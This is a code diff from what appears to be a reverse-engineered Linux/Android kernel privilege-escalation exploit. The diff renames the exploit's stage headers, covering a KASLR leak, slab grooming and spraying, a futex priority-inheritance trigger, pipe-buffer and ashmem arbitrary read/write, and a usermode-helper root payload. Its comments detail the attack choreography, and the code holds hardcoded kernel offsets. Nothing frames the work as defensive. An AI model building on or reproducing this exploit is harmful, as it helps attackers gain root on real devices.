@@ -27,13 +27,13 @@
 #include <time.h>
 #include <unistd.h>
 
-#include "aar_aaw.h"
-#include "futex_trigger.h"
-#include "groom.h"
-#include "kaslr.h"
-#include "pipe_physrw.h"
-#include "root_umh.h"
-#include "slabinfo.h"
+#include "08_ashmem_configfs_rw.h"
+#include "07_futex_pi_trigger.h"
+#include "05_mm_slab_grooming.h"
+#include "01_kernel_base_tracefs.h"
+#include "09_pipe_buffer_rw.h"
+#include "10_workqueue_umh_root.h"
+#include "02_slab_cache_probe.h"
 
 /* source: FUN_0010a9d8 -- getenv + strtol clamped to [min,max], falling
  * back to `fallback` on any parse error or out-of-range value. */
@@ -322,7 +322,7 @@ static int do_one_attempt(struct attempt_shared_state *shared,
 
   /* source: FUN_00106288 opens with a diagnostic FUN_00106ec0() call
    * (/proc/slabinfo "mm_struct" line) before ever forking/spraying.
-   * Ported faithfully as read_mm_slabinfo() (src/slabinfo.c). Read-only,
+   * Ported faithfully as read_mm_slabinfo() (src/02_slab_cache_probe.c). Read-only,
    * safe. */
   struct mm_slabinfo before;
   if (read_mm_slabinfo(&before)) {
@@ -352,8 +352,8 @@ static int do_one_attempt(struct attempt_shared_state *shared,
   uint64_t init_task_addr = kernel_base + 0x02c05080ULL;
   uint64_t ashmem_misc_fops_addr = kernel_base + 0x02bfcf28ULL;
 
-  /* source: FUN_00106288 in full -- groom.c ports the exact-match
-   * fork/kill/leak/drain/spray choreography (see groom.h) and writes
+  /* source: FUN_00106288 in full -- 05_mm_slab_grooming.c ports the exact-match
+   * fork/kill/leak/drain/spray choreography (see 05_mm_slab_grooming.h) and writes
    * build_fops_install_object()'s corrected fields into the reclaimed
    * page. Still no real trigger fired: the kernel now merely *contains*
    * our bytes at payload_base, nothing has read task->pi_blocked_on
@@ -375,14 +375,14 @@ static int do_one_attempt(struct attempt_shared_state *shared,
           (unsigned long long)init_task_addr);
 
   /* source: FUN_00103e18 (waiter) + FUN_00104274 (owner) + FUN_00104300
-   * (consumer/sched_setattr trigger). See futex_trigger.c for the
+   * (consumer/sched_setattr trigger). See 07_futex_pi_trigger.c for the
    * triple-verified derivation. This is the first real kernel-touching
    * trigger in this clean-room engine -- everything before this point
    * (tracefs, kernelsnitch leak, groom+spray) is read-only or userspace
    * reclaim only. */
   /* root_umh_path was validated before KASLR and allocator grooming. */
 
-  /* source: run_futex_trigger_v11_{cb,full} (futex_trigger.h/.c) --
+  /* source: run_futex_trigger_v11_{cb,full} (07_futex_pi_trigger.h/.c) --
    * supersedes v10 in this wiring. v10's own comment claimed the real
    * verify-call gate (G+0x760) "never opens... never written to a
    * nonzero value anywhere r2 can resolve statically", and so called
@@ -441,11 +441,11 @@ static int do_one_attempt(struct attempt_shared_state *shared,
 /* source: FUN_000041f0(0) -- sched_setaffinity(0, 0x80, &(1<<0)), the
  * very first call fcn.000044f4 (this project's app_main() equivalent)
  * makes, before even the rlimit adjustments. Same helper shape as
- * futex_trigger.c's pin_to_cpu(3) for the waiter thread (raw disasm
+ * 07_futex_pi_trigger.c's pin_to_cpu(3) for the waiter thread (raw disasm
  * confirmed both this session, not duplicated code by accident --
  * kept as a small standalone copy here rather than sharing a header,
  * since it's a two-line wrapper and this file doesn't otherwise depend
- * on futex_trigger.c's internals). */
+ * on 07_futex_pi_trigger.c's internals). */
 static int pin_to_cpu(int cpu) {
   cpu_set_t set;
   CPU_ZERO(&set);
@@ -462,7 +462,7 @@ static int pin_to_cpu(int cpu) {
  * the hard limit for both resources, treating any getrlimit/setrlimit
  * failure as fatal (matches the closed binary's own `fatal_usage()`-
  * equivalent call at each failure branch). Directly relevant to this
- * project's own documented history: groom.c forks and holds open
+ * project's own documented history: 05_mm_slab_grooming.c forks and holds open
  * memfds for up to ~1279 children in one attempt, and this session
  * separately root-caused an earlier "F_SETPIPE_SZ Operation not
  * permitted" failure in the OLD engine to exactly this kind of
